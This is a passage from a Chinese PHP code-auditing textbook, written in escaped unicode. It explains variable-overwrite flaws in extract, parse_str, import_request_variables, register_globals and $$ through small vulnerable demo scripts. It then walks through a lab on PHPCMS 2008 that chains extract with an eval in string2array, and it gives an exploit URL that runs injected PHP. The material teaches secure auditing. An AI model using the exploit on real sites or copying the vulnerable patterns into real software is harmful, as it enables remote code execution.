l prefix\uFF1A\u8BE5\u53C2\u6570\u4EC5\u5728extract_type\u7684\u503C\u662FEXTR_PREFIX_SAME\u3001EXTR_PREFIX_ALL\u3001EXTR_PREFIX_INVALID\u3001EXTR_PREFIX_IF_EXISTS\u65F6\u9700\u8981\u3002\u5982\u679C\u9644\u52A0\u4E86\u524D\u7F00\u540E\u7684\u7ED3\u679C\u4E0D\u662F\u5408\u6CD5\u7684\u53D8\u91CF\u540D\uFF0C\u5C06\u4E0D\u4F1A\u5BFC\u5165\u5230\u7B26\u53F7\u8868\u4E2D\u3002\r
\r
\u8BE5\u51FD\u6570\u5BFC\u81F4\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u4E3B\u8981\u7531\u5176\u7B2C\u4E8C\u4E2A\u53C2\u6570\u51B3\u5B9A\uFF0C\u5BFC\u81F4\u8BE5\u6F0F\u6D1E\u6709\u5982\u4E0B\u4E24\u79CD\u60C5\u51B5\uFF1A\r
\r
l \u5F53extract_rules\u53C2\u6570\u4E3A\u7A7A\u6216EXTR_OVERWRITE\u65F6\uFF0C\u5B83\u8868\u793A\u5982\u679C\u6709\u51B2\u7A81\uFF0C\u5219\u8986\u76D6\u5DF2\u6709\u7684\u53D8\u91CF\u3002\r
\r
l \u5F53extract_rules\u53C2\u6570\u4E3AEXTR_IF_EXISTS \u65F6\uFF0C\u5B83\u8868\u793A\u4EC5\u5728\u5F53\u524D\u8868\u4E2D\u5DF2\u6709\u540C\u540D\u53D8\u91CF\u65F6\uFF0C\u8986\u76D6\u5B83\u4EEC\u7684\u503C\uFF0C\u5176\u4ED6\u7684\u90FD\u4E0D\u6CE8\u518C\u65B0\u53D8\u91CF\u3002\r
\r
extract\u51FD\u6570\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
$a = 1;\r
\r
print_r("extract()\u6267\u884C\u4E4B\u524D\uFF1A\\$a = ".$a."<br />");\r
\r
$b = array('a'=>'2');\r
\r
extract($b);\r
\r
print_r("extract()\u6267\u884C\u4E4B\u540E\uFF1A\\$a = ".$a."<br />");\r
\r
?>\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u9996\u5148\u5B9A\u4E49\u53D8\u91CF$a\u503C\u4E3A1\uFF0C\u7136\u540E\u5B9A\u4E49\u6570\u7EC4\u5E76\u4F7F\u7528extract\u51FD\u6570\u8FDB\u884C\u53D8\u91CF$a\u503C\u8986\u76D6\u5E76\u8FDB\u884C\u6253\u5370\u3002\u8F93\u5165\u8DEF\u5F84\uFF1Ahttp://ip/extract.php\u8BBF\u95EE\u7F51\u7AD9\u6839\u8DEF\u5F84\u4E0Bextract.php\u6587\u4EF6\uFF0C\u5982\u56FE10-1\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image480.jpg)\r
\r
\u56FE10-1 extract\u53D8\u91CF\u8986\u76D6\u6D4B\u8BD5\u56FE\r
\r
### 10.2.2 parse_str\u51FD\u6570\u4F7F\u7528\u4E0D\u5F53\r
\r
parse_str()\u51FD\u6570\u7684\u4F5C\u7528\u662F\u89E3\u6790\u5B57\u7B26\u4E32\u5E76\u4E14\u6CE8\u518C\u6210\u53D8\u91CF\uFF0C\u5B83\u5728\u6CE8\u518C\u53D8\u91CF\u4E4B\u524D\u4E0D\u4F1A\u9A8C\u8BC1\u5F53\u524D\u53D8\u91CF\u662F\u5426\u5DF2\u7ECF\u5B58\u5728\uFF0C\u6240\u4EE5\u4F1A\u76F4\u63A5\u8986\u76D6\u6389\u5DF2\u6709\u7684\u53D8\u91CF\u3002parse_str\u51FD\u6570\u7ED3\u6784\u5982\u4E0B\uFF1A\r
\r
parse_str(string,array)\r
\r
l string\uFF1A\u89C4\u5B9A\u8981\u89E3\u6790\u7684\u5B57\u7B26\u4E32\uFF08\u5FC5\u9009\uFF09\uFF1B\r
\r
l array\uFF1A\u89C4\u5B9A\u5B58\u50A8\u53D8\u91CF\u7684\u6570\u7EC4\u540D\u79F0\uFF0C\u8BE5\u53C2\u6570\u6307\u793A\u53D8\u91CF\u5B58\u50A8\u5230\u6570\u7EC4\u4E2D\uFF08\u53EF\u9009\uFF09\u3002\r
\r
parse_str\u51FD\u6570\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
$var='init';\r
\r
parse_str($_SERVER['QUERY_STRING']);\r
\r
print $var;\r
\r
?>\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u9996\u5148\u5B9A\u4E49\u53D8\u91CF$var\u503C\u4E3Ainit\uFF0C\u7136\u540E\u5B9A\u4E49\u6570\u7EC4\u5E76\u4F7F\u7528parse_str\u51FD\u6570\u8FDB\u884C\u53D8\u91CF$var\u503C\u8986\u76D6\u5E76\u8FDB\u884C\u6253\u5370\u3002\u8F93\u5165\u8DEF\u5F84\uFF1Ahttp://ip/test.php?var=new\u8BBF\u95EE\u7F51\u7AD9\u6839\u8DEF\u5F84\u4E0Btest.php\u6587\u4EF6\uFF0C\u5982\u56FE10-2\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image482.gif)\r
\r
\u56FE10-2 parse_str\u53D8\u91CF\u8986\u76D6\u6D4B\u8BD5\u56FE\r
\r
### 10.2.3 import_request_variables\u51FD\u6570\u4F7F\u7528\u4E0D\u5F53\r
\r
Import_request_variables()\u51FD\u6570\u7684\u4F5C\u7528\u662F\u628AGET\u3001POST\u3001Cookie\u7684\u53C2\u6570\u6CE8\u518C\u6210\u53D8\u91CF\uFF0C\u4E14\u8BE5\u51FD\u6570\u53EA\u80FD\u5728PHP4.1\u81F3PHP5.4\u4E4B\u95F4\u3002import_request_variables()\u51FD\u6570\u7684\u7ED3\u6784\u5982\u4E0B\uFF1A\r
\r
import_request_variables(string $types,string $prefix)\r
\r
l types\uFF1A\u6307\u5B9A\u8981\u5BFC\u5165\u7684\u53D8\u91CF\uFF0C\u53EF\u4EE5\u7528\u5B57\u6BCDG\u3001P\u548CC\u5206\u522B\u8868\u793AGET\u3001POST\u3001COOKIE\uFF08\u53EF\u4EE5\u4F7F\u7528g\u3001p\u3001c\uFF0C\u5B57\u6BCD\u4E0D\u533A\u5206\u5927\u5C0F\u5199\uFF09\uFF1B\r
\r
l prefix\uFF1A\u53D8\u91CF\u540D\u7684\u524D\u7F00\uFF0C\u7F6E\u4E8E\u6240\u6709\u88AB\u5BFC\u5165\u5230\u5168\u5C40\u4F5C\u7528\u57DF\u7684\u53D8\u91CF\u4E4B\u524D\u3002\u6240\u4EE5\u5982\u679C\u4F60\u6709\u4E2A\u540D\u4E3Auserid\u7684GET\u53D8\u91CF\uFF0C\u540C\u65F6\u63D0\u4F9B\u4E86pref_\u4F5C\u4E3A\u524D\u7F00\uFF0C\u90A3\u4E48\u5C31\u53EF\u83B7\u5F97\u4E00\u4E2A\u540D\u4E3A$pref_userid\u7684\u5168\u5C40\u53D8\u91CF\u3002\r
\r
import_request_variables\u51FD\u6570\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
$auth = '0';\r
\r
import_request_variables('G');\r
\r
if($auth == 1){\r
\r
 echo "private!";\r
\r
}else{\r
\r
 echo "public!";}\r
\r
?>\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u9996\u5148\u5B9A\u4E49\u53D8\u91CF$auth\u503C\u4E3A0\uFF0C\u7136\u540Eimport_request_variables('G')\u6307\u5B9A\u5BFC\u5165GET\u8BF7\u6C42\u4E2D\u7684\u53D8\u91CF\uFF0C\u4ECE\u800C\u5BFC\u81F4\u53D8\u91CF\u8986\u76D6$auth\u3002\u5F53\u7528\u6237\u8F93\u5165http://ip/test1.php?auth=1\u65F6\uFF0C\u7F51\u9875\u4E0A\u4F1A\u8F93\u51FA\u201Cprivate\uFF01\u201D\uFF0C\u5982\u56FE10-3\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image484.gif)\r
\r
\u56FE10-3 import_request_variables\u53D8\u91CF\u8986\u76D6\u56FE\r
\r
### 10.2.4 \u5168\u5C40\u53D8\u91CF\u8986\u76D6\r
\r
\u5168\u5C40\u6BD4\u53D8\u91CF\u8986\u76D6\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
echo "Register_globals: ".(int)ini_get("register_globals")."<br/>";\r
\r
if ($auth){\r
\r
  echo "private!";}\r
\r
?>\r
\r
\r
\r
\u5F53register_globals=OFF\u65F6\uFF0C\u4E0A\u8FF0\u4EE3\u7801\u65E0\u6CD5\u5C06\u672A\u521D\u59CB\u5316\u7684\u53D8\u91CF\u8FDB\u884C\u6CE8\u518C\uFF0C\u8BBF\u95EEURL\u4E3Ahttp:// ip/test1.php?auth=1\uFF0C\u663E\u793A\u9875\u9762\u5982\u56FE10-4\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image486.gif)\r
\r
\u56FE10-4 \u5168\u5C40\u53D8\u91CF\u8986\u76D6\u6D4B\u8BD5\u56FE1\r
\r
\u5F53register_global=ON\u65F6\uFF0C\u53D8\u91CF\u6765\u6E90\u53EF\u80FD\u662F\u5404\u4E2A\u4E0D\u540C\u7684\u5730\u65B9\uFF0C\u6BD4\u5982\u9875\u9762\u7684\u8868\u5355\uFF0CCookie\u7B49\u3002\u63D0\u4EA4\u8BF7\u6C42URL\uFF1Ahttp://ip /test.php?auth=1\uFF0C\u53D8\u91CF$auth\u5C06\u81EA\u52A8\u5F97\u5230\u8D4B\u503C\uFF0C\u663E\u793A\u9875\u9762\u5982\u56FE10-5\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image488.gif)\r
\r
\u56FE10-5\u5168\u5C40\u53D8\u91CF\u8986\u76D6\u6D4B\u8BD5\u56FE2\r
\r
\u8FD8\u6709\u4E00\u79CD\u60C5\u51B5\uFF0C\u901A\u8FC7$GLOBALS\u83B7\u53D6\u7684\u53D8\u91CF\u5728\u4F7F\u7528\u4E0D\u5F53\u65F6\u4E5F\u4F1A\u5BFC\u81F4\u53D8\u91CF\u8986\u76D6\uFF0C\u6F0F\u6D1E\u89E6\u53D1\u524D\u63D0\u662Fregister_globals\u4E3AON\uFF0C\u53EF\u4EE5\u901A\u8FC7GLOBALS[a]\u6765\u6539\u53D8$a\u7684\u503C\uFF0C\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
echo "Register_globals:".(int)ini_get("register_globals")."<br/>";\r
\r
if (ini_get('register_globals')) foreach($_REQUEST as $k=>$v) unset(\${$k});\r
\r
print $a;\r
\r
print $_GET[b];\r
\r
?>\r
\r
\r
\r
\u53D8\u91CF$a\u672A\u521D\u59CB\u5316\uFF0C\u5F53\u4F7F\u7528URL\u4E3Ahttp://ip/test2.php?GLOBALS[a]=1&b=2\uFF0C\u5C1D\u8BD5\u6CE8\u5165\u201CGLOBALS[a]\u201D\u4EE5\u8986\u76D6\u5168\u5C40\u53D8\u91CF\u65F6\uFF0C\u5219\u53EF\u4EE5\u6210\u529F\u63A7\u5236\u53D8\u91CF\u201C$a\u201D\u7684\u503C\u3002\u4E0A\u8FF0\u4EE3\u7801\u4E2Dunset()\u9ED8\u8BA4\u53EA\u4F1A\u9500\u6BC1\u5C40\u90E8\u53D8\u91CF\uFF0C\u8981\u9500\u6BC1\u5168\u5C40\u53D8\u91CF\u5FC5\u987B\u4F7F\u7528$GLOBALS\uFF0C\u5982\u56FE10-6\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image490.gif)\r
\r
\u56FE10-6\u5168\u5C40\u53D8\u91CF\u8986\u76D6\u6D4B\u8BD5\u56FE3\r
\r
### 10.2.5 $$\u53D8\u91CF\u8986\u76D6\r
\r
$$\u662F\u4E00\u79CD\u53EF\u53D8\u53D8\u91CF\u7684\u5199\u6CD5\uFF0C\u5B83\u53EF\u4EE5\u4F7F\u4E00\u4E2A\u666E\u901A\u53D8\u91CF\u7684\u503C\u4F5C\u4E3A\u53EF\u53D8\u53D8\u91CF\u7684\u540D\u5B57\uFF0C\u8FD9\u79CD\u7C7B\u578B\u5E38\u5E38\u4F1A\u4F7F\u7528\u904D\u5386\u7684\u65B9\u5F0F\u6765\u91CA\u653E\u53D8\u91CF\u7684\u4EE3\u7801\uFF0C\u6700\u5E38\u89C1\u7684\u5C31\u662Fforeach\u7684\u904D\u5386\uFF0C\u793A\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
$a=2;\r
\r
foreach(array('$_COOKIE','_POST','_GET') as $_request)\r
\r
{\r
\r
  foreach($$_request as $_key=>$_value)\r
\r
  {  echo $_key.'<br />';\r
\r
\u200B    $$_key= addslashes($_value);\r
\r
  }}\r
\r
echo $a;\r
\r
?>\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u9996\u5148\u5C06$_COOKIE\u3001$_POST\u3001$_GET\u65B9\u6CD5\u4F20\u9012\u7684\u8BF7\u6C42\u904D\u5386\uFF0C\u5E76\u5BF9\u6BCF\u4E2A\u8BF7\u6C42\u4E2D\u7684\u53C2\u6570\u4E0E\u503C\u8FDB\u884C\u62BD\u8C61\u4E3A$_request\u3002$_key\u4E3ACOOKIE\u3001POST\u3001GET\u4E2D\u7684\u53C2\u6570\uFF0C$_value\u4E3A$_key\u53C2\u6570\u7684\u503C\u3002\u53D8\u91CF$a=addslashes($_value);\u4F1A\u8986\u76D6\u5DF2\u6709\u7684\u53D8\u91CF$a\u7684\u503C\u3002\r
\r
\u5728\u6D4F\u89C8\u5668\u8F93\u5165http://ip/test.php?a=666\uFF0C\u7ED3\u679C\u5982\u56FE10-7\u6240\u793A\uFF0C\u53EF\u4EE5\u770B\u5230\u5DF2\u7ECF\u6210\u529F\u628A\u53D8\u91CF$a\u7684\u503C\u75312\u8986\u76D6\u6210\u4E86666\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image492.gif)\r
\r
\u56FE10-7 $$\u53D8\u91CF\u8986\u76D6\u6D4B\u8BD5\u56FE\r
\r
## 10.3 \u53D8\u91CF\u8986\u76D6\u5BA1\u8BA1CMS\u5B9E\u8DF5\r
\r
### 10.3.1  \u5B9E\u9A8C\uFF1APHPCMS2008\u53D8\u91CF\u8986\u76D6\u5BA1\u8BA1\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
\u672C\u5B9E\u9A8C\u5C06\u5BF9PHPCMS 2008\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u4F5C\uFF0C\u5BA1\u8BA1\u8BE5CMS\u4E2D\u662F\u5426\u5B58\u5728\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u80039.1.1\u8282\uFF1A\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u7B80\u4ECB\uFF1B9.1.2\u8282\uFF1A\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u5BA1\u8BA1\u7ECF\u9A8C\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1BPHPCMS2008\u5B89\u88C5\u5305\uFF1BPhpStorm\u5DE5\u5177\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\uFF081\uFF09\u5BA1\u8BA1\u9636\u6BB5\r
\r
\`\`\`\r
\u5BF9\u5168\u5C40\u901A\u7528\u6587\u4EF6\u8FDB\u884C\u5BA1\u8BA1\uFF0C\u70B9\u51FB\u5C55\u5F00/yp/web/include/common.inc.php\uFF0C\u4EE3\u7801\u5982\u4E0B\u3002\u7A0B\u5E8F\u6D41\u7A0B\u4E3A\uFF1A\r
l  \u7A0B\u5E8F\u9996\u5148\u8D4B\u503C\u4E00\u4E2A$userid\u53D8\u91CF\u3002\r
l  \u7136\u540E\u4F7F\u7528\u8D4B\u503C\u5B8C\u6210\u53D8\u91CF\u62FC\u63A5SQL\u8BED\u53E5\u6267\u884C\uFF0CSQL\u8BED\u53E5\u6267\u884C\u5B8C\u6210\u4EE5\u540E\u8FD4\u56DE\u6570\u636E\u7ED9$r\u53D8\u91CF\u6570\u7EC4\uFF0C\u5982\u679C$r\u53D8\u91CF\u5B58\u5728\u5185\u5BB9\uFF0C\u5219\u5C06\u53D8\u91CF\u6570\u7EC4\u5185\u5BB9\u52A0\u5165\u5230\u5F53\u524D\u6587\u4EF6\u7684\u7B26\u53F7\u8868\u4E2D\u8FDB\u884C\u53D8\u91CF\u8986\u76D6\u3002\r
l  \u5982\u679C$userid\u53D8\u91CF\u5185\u5BB9\u4E3Afalse\u5219\u5C06\u663E\u793A\u9519\u8BEF\u9875\u9762\u5185\u5BB9\u3002\r
\`\`\`\r
\r
l \u5982\u679C$userid\u4E0D\u4E3Afalse\uFF0C\u5219\u8FDB\u884C\u521D\u59CB\u5316\u6A21\u677F\u6587\u4EF6.\r
\r
l \u5C06$menu\u53D8\u91CF\u4F20\u8F93\u5230string2array()\u51FD\u6570\u3002\r
\r
\r
\r
\`\`\`\r
<?php\r
defined('IN_PHPCMS') or exit('Access Denied');\r
//\u8D4B\u503C$userid\u53D8\u91CF\r
$userid = $userid ? $userid : intval(QUERY_STRING);\r
//\u62FC\u63A5SQL\u8BED\u53E5\u5E76\u67E5\u8BE2\r
$r = $db->get_one("SELECT * FROM \`".DB_PRE."member_company\` WHERE \`userid\`='$userid'");\r
//\u5982\u679C\u67E5\u8BE2\u6709\u7ED3\u679C\uFF0C\u5219\u6839\u636E\u67E5\u8BE2\u7684\u7ED3\u679C\u8C03\u7528extract\u51FD\u6570\u8FDB\u884C\u53D8\u91CF\u8986\u76D6\r
if($r){extract($r);}\r
//\u5982\u679C$userid\u4E3Afalse\u5219\u6253\u5370\u9875\u9762\u9519\u8BEF\r
if(!$userid)\r
{$MS['title'] = '\u4F60\u8981\u8BBF\u95EE\u7684\u7AD9\u70B9\u4E0D\u5B58\u5728';\r
 $MS['description'] = '\u8BF7\u6838\u5BF9\u7F51\u5740\u662F\u5426\u6B63\u786E.';\r
 \u2026\u7701\u7565\u2026\r
 msg($MS);}\r
//\u5982\u679C$userid\u4E3Atrue\u5219\u521D\u59CB\u5316\u6A21\u677F\u6587\u4EF6\r
if(empty($tplname)) $tplname = 'default';\r
//\u7528\u6237\u9009\u62E9\u7684\u9ED8\u8BA4\u6A21\u677F\r
$companytpl_config = include PHPCMS_ROOT.'templates/'.TPL_NAME.'/yp/companytplnames.php';\r
$tpl = $companytpl_config[$tplname]['tplname'];\r
define('TPL', $tpl);\r
define('WEB_SKIN', 'templates/'.TPL_NAME.'/yp/css/');\r
if($diy){define('SKIN_DIY', WEB_SKIN.$userid.'_diy.css');}\r
else{define('SKIN_DIY', WEB_SKIN.$companytpl_config[$tplname]['style']);}\r
//\u5C06$menu\u53D8\u91CF\u4F20\u8F93\u5230string2array()\u51FD\u6570\r
$menu = string2array($menu);\r
\`\`\`\r
\r
\u2026\u7701\u7565\u2026\r
\r
\r
\r
\u5BF9string2array()\u51FD\u6570\u4EE3\u7801\u8FDB\u884C\u5BA1\u8BA1\uFF0Cinclude/global.func.php\u7684string2array\u51FD\u6570\u5B58\u5728\u4E86eval\u51FD\u6570\uFF08\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u654F\u611F\u51FD\u6570\uFF09\uFF0C\u8BE5\u51FD\u6570\u5C06$menu\u53D8\u91CF\u4EE5PHP\u4EE3\u7801\u6267\u884C\uFF0C\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
\`\`\`\r
function string2array($data)\r
{\r
//\u5982\u679C$data\u53D8\u91CF\u4E3A\u7A7A\u5B57\u7B26\u5219\u76F4\u63A5\u8FD4\u56DE\u7A7A\u6570\u7EC4\r
   if($data == '') return array();\r
//\u6267\u884C\\$array = $data;\u4EE3\u7801\r
   eval("\\$array = $data;");\r
   return $array;\r
}\r
\`\`\`\r
\r
\r
\r
\u81F3\u6B64\uFF0C\u5F97\u51FA\u7ED3\u8BBA\uFF1A\u5982\u679C\u7A0B\u5E8F\u4E2D$menu\u53D8\u91CF\u53EF\u63A7\uFF0C\u5C31\u5B58\u5728\u4EFB\u610F\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u3002\u8BE5\u6F0F\u6D1E\u7684\u5229\u7528\u6761\u4EF6\u4E3A\uFF1A\r
\r
l $userid\u53EF\u4ECE\u6570\u636E\u5E93\u67E5\u8BE2\u5185\u5BB9\uFF0C\u7136\u540E\u5C06\u8FD4\u56DE\u5185\u5BB9\u6784\u6210\u6570\u7EC4$r\u3002\r
\r
l \u4F7F\u7528extract()\u5C06\u6570\u7EC4\u7684\u5185\u5BB9\u6DFB\u52A0\u5230\u5F53\u524D\u7B26\u53F7\u8868\u4E2D\u5E76\u751F\u6210$menu\u53D8\u91CF\u3002\r
\r
l \u4F46\u662F\uFF0C\u5982\u679C\u6570\u636E\u5E93\u67E5\u8BE2\u4E3A\u7A7A\uFF0C\u5219\u65E0\u6CD5\u751F\u6210\u53D8\u91CF$menu\u3002\u8FD9\u5C31\u9700\u8981\u901A\u8FC7\u5176\u4ED6\u4EE3\u7801\u751F\u6210\u65B0$menu\u53D8\u91CF\uFF08\u4E0B\u6587common.inc.php\u6587\u4EF6\u53EF\u751F\u6210\u65B0$menu\u53D8\u91CF\uFF09\u3002\r
\r
include/common.inc.php\u6587\u4EF6\u4EE3\u7801\u5982\u4E0B\uFF0C\u5176\u4F1A\u5C06GET\u3001POST\u3001Cookie\u8F6C\u6362\u6210\u53D8\u91CF\uFF0C\u6240\u4EE5\u53EF\u5229\u7528\u8BE5\u4EE3\u7801\u63D0\u524D\u751F\u6210$menu\u53D8\u91CF\u548C$userid\u53D8\u91CF\uFF0C\u5E76\u4E14\u628A$userid\u5185\u5BB9\u7F6E\u4E3A\u6570\u636E\u5E93\u4E0D\u5B58\u5728\u7684\u5185\u5BB9\uFF0C$menu\u53D8\u91CF\u5185\u5BB9\u4E3A\u60F3\u8981\u6267\u884C\u7684\u6076\u610F\u4EE3\u7801\u3002\u4F8B\u5982\uFF1A$userid\u7F6E\u4E3Auserid=123456\uFF0C$menu\u7F6E\u4E3Amenu=phpinfo();exit;\u3002\r
\r
\r
\r
if($_REQUEST)\r
 { //\u5224\u65ADMAGIC_QUOTES_GPC\u662F\u5426\u5F00\u542F\r
  if(**MAGIC_QUOTES_GPC**)\r
  {\r
    $_REQUEST = new_stripslashes($_REQUEST);\r
    if($_COOKIE) $_COOKIE = new_stripslashes($_COOKIE);\r
    extract($db->escape($_REQUEST), EXTR_SKIP);}\r
  else\r
  { //\u82E5\u672A\u5F00\u542FMAGIC_QUOTES_GPC\u5219\u6267\u884C\u4E0B\u65B9\u4EE3\u7801\r
    $_POST = $db->**escape**($_POST);//\u8C03\u7528\u81EA\u5B9A\u4E49escape\u51FD\u6570\u5BF9\u53C2\u6570\u8FDB\u884C\u8FC7\u6EE4\r
    $_GET = $db->**escape**($_GET);\r
    $_COOKIE = $db->**escape**($_COOKIE);\r
    **@extract($_POST,EXTR_SKIP);//****\u53D8\u91CF\u8986\u76D6\u751F\u6210\u65B0$menu\u53D8\u91CF\r
    @extract($_GET,EXTR_SKIP);\r
    @extract($_COOKIE,EXTR_SKIP);}\r
**  if(!defined('IN_ADMIN')) $_REQUEST = filter_xss($_REQUEST, ALLOWED_HTMLTAGS);\r
  if($_COOKIE) $db->escape($_COOKIE);}\r
\r
\r
\r
\uFF081\uFF09  \u786E\u5B9A\u8BE5\u529F\u80FD\u8BBF\u95EE\u6D41\u7A0B\r
\r
\u8BE5\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u7684\u5229\u7528\u6D41\u7A0B\u5982\u56FE10-8\u6240\u793A\uFF0C\u9996\u5148\u4ECE/yp/web/index.php\u6587\u4EF6\u4E2D\u5305\u542Bcommon.inc.php\u6587\u4EF6\u5E76\u8C03\u7528extract\u51FD\u6570\u5C06GET\u3001POST\u3001Cookie\u8F6C\u6362\u6210\u53D8\u91CF\u3002\u8BBF\u95EE/yp/web/include/common.php\u6587\u4EF6\uFF0C\u901A\u8FC7\u4F20\u9012\u53C2\u6570userid\u548Cmenu\u6765\u63A7\u5236\u51FD\u6570\u6267\u884C\u6D41\u7A0B\uFF0C\u5982\u56FE9-8\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image494.jpg)\r
\r
\u56FE10-8 \u51FD\u6570\u6267\u884C\u6D41\u7A0B\u56FE\r
\r
\uFF082\uFF09  \u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u5229\u7528\r
\r
\u8BBF\u95EE\u8DEF\u5F84\uFF1Ahttp://ip/yp/web/index.php?userid=123456&menu=phpinfo();exit;\u3002\r
\r
\u8BE5\u8DEF\u5F84\u4F20\u9012\u53C2\u6570userid\u4E3A123456\uFF0C\u53C2\u6570menu\u4E3Aphpinfo();exit()\u3002\u9996\u5148\u6267\u884Cextract\u51FD\u6570\u8BBE\u7F6Euserid\u548Cmenu\u7684\u53C2\u6570\u503C\uFF0C\u7136\u540E\u8C03\u7528/yp/web/include/common.php\u6587\u4EF6\u901A\u8FC7\u53C2\u6570\u63A7\u5236\u51FD\u6570\u6267\u884C\u6D41\u7A0B\uFF0C\u6700\u540E\u8C03\u7528eval\u51FD\u6570\u6267\u884C\u6076\u610F\u4EE3\u7801\uFF0C\u6F0F\u6D1E\u5229\u7528\u5982\u56FE10-9\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image496.jpg)\r
\r
\u56FE10-9 \u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u5229\u7528\u56FE\r
\r
## 10.4 \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\r
\r
\u4E3A\u4E86\u6709\u6548\u5730\u5B58\u50A8\u6216\u4F20\u9012\u6570\u636E\uFF0C\u540C\u65F6\u4E0D\u4E22\u5931\u5176\u7C7B\u578B\u548C\u7ED3\u6784\uFF0C\u5F88\u591A\u7A0B\u5E8F\u7ECF\u5E38\u4F7F\u7528\u5E8F\u5217\u5316\u548C\u53CD\u5E8F\u5217\u5316\u51FD\u6570\u5BF9\u6570\u636E\u8FDB\u884C\u5904\u7406\u3002\u5E8F\u5217\u5316\u51FD\u6570\u8FD4\u56DE\u5B57\u7B26\u4E32\uFF0C\u6B64\u5B57\u7B26\u4E32\u5305\u542B\u4E86\u8868\u793A\u503C\u7684\u5B57\u8282\u6D41\uFF0C\u53EF\u4EE5\u5B58\u50A8\u4E8E\u4EFB\u4F55\u5730\u65B9\u3002\u53CD\u5E8F\u5217\u51FD\u6570\u5BF9\u5355\u4E00\u7684\u5DF2\u5E8F\u5217\u5316\u53D8\u91CF\u8FDB\u884C\u64CD\u4F5C\uFF0C\u5C06\u5176\u8F6C\u6362\u56DE\u539F\u6765\u7684\u503C\u3002\u8FD9\u4E24\u4E2A\u8FC7\u7A0B\u7ED3\u5408\u8D77\u6765\u53EF\u4EE5\u5B9E\u73B0\u6570\u636E\u7684\u5B58\u50A8\u548C\u4F20\u8F93\u6570\u636E\uFF0C\u4F7F\u7A0B\u5E8F\u66F4\u5177\u7EF4\u62A4\u6027\u3002\r
\r
### 10.4.1 \u5E8F\u5217\u5316\u4ECB\u7ECD\r
\r
PHP\u8BED\u8A00\u4E2D\u5E38\u89C1\u7684\u5E8F\u5217\u5316\u548C\u53CD\u5E8F\u5217\u5316\u51FD\u6570\u6709serialize\u3001unserialize\u3001json_encode\u548Cjson_decode\uFF0C\u4E0B\u9762\u5BF9\u51E0\u79CD\u5E38\u89C1\u7C7B\u578B\u6570\u636E\u7684\u5E8F\u5217\u5316\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
\uFF081\uFF09  NULL\u7C7B\u578B\u7684\u5E8F\u5217\u5316\r
\r
\u5728PHP\u8BED\u8A00\u4E2DNULL\u7C7B\u578B\u5E8F\u5217\u5316\u540E\u4E3AN\uFF0C\u793A\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
$t=NULL;\r
\r
$tr=serialize($t);\r
\r
echo "serialize NULL result: ".$tr;\r
\r
?>\r
\r
\r
\r
\u8F93\u51FA\u7ED3\u679C\u4E3A\uFF1Aserialize NULL result: **N**;\u3002\r
\r
\uFF082\uFF09  boolean\u7C7B\u578B\u7684\u5E8F\u5217\u5316\r
\r
\u5728PHP\u8BED\u8A00\u4E2Dboolean\u7C7B\u578B\u6570\u636E\u5E8F\u5217\u5316\u540E\u4E3Ab:<digit>\uFF0C\u5176\u4E2D<digit>\u4E3A0\u6216\u80051\uFF0C0\u8868\u793Aboolean\u7C7B\u578B\u7684false\uFF0C1\u8868\u793Aboolean\u7C7B\u578B\u7684true\u3002\u793A\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
